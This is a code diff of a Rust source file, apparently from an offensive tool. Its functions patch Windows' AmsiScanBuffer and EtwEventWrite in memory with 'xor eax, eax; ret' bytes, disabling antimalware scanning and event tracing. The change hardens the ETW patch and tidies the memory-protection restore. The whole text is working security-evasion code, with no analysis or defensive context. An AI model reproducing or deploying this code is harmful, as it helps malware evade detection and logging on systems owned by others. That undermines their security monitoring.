@@ -10,7 +10,8 @@ pub unsafe fn patch_amsi() {
     winapi::um::memoryapi::VirtualProtect(AmsiScanBuffer as *mut _, 3, winapi::um::winnt::PAGE_EXECUTE_READWRITE, &mut old_protect);
     let patch: [u8; 3] = [0x31, 0xC0, 0xC3]; // xor eax, eax; ret
     std::ptr::copy_nonoverlapping(patch.as_ptr(), AmsiScanBuffer as *mut u8, 3);
-    winapi::um::memoryapi::VirtualProtect(AmsiScanBuffer as *mut _, 3, old_protect, &mut old_protect);
+    let mut dummy = 0;
+    winapi::um::memoryapi::VirtualProtect(AmsiScanBuffer as *mut _, 3, old_protect, &mut dummy);
 }
 
 #[cfg(windows)]
@@ -21,10 +22,11 @@ pub unsafe fn patch_etw() {
     if EtwEventWrite.is_null() { return; }
 
     let mut old_protect = 0;
-    winapi::um::memoryapi::VirtualProtect(EtwEventWrite as *mut _, 1, winapi::um::winnt::PAGE_EXECUTE_READWRITE, &mut old_protect);
-    let patch: [u8; 1] = [0xC3]; // ret
-    std::ptr::copy_nonoverlapping(patch.as_ptr(), EtwEventWrite as *mut u8, 1);
-    winapi::um::memoryapi::VirtualProtect(EtwEventWrite as *mut _, 1, old_protect, &mut old_protect);
+    winapi::um::memoryapi::VirtualProtect(EtwEventWrite as *mut _, 3, winapi::um::winnt::PAGE_EXECUTE_READWRITE, &mut old_protect);
+    let patch: [u8; 3] = [0x31, 0xC0, 0xC3]; // xor eax, eax; ret
+    std::ptr::copy_nonoverlapping(patch.as_ptr(), EtwEventWrite as *mut u8, 3);
+    let mut dummy = 0;
+    winapi::um::memoryapi::VirtualProtect(EtwEventWrite as *mut _, 3, old_protect, &mut dummy);
 }
 
 #[cfg(not(windows))]
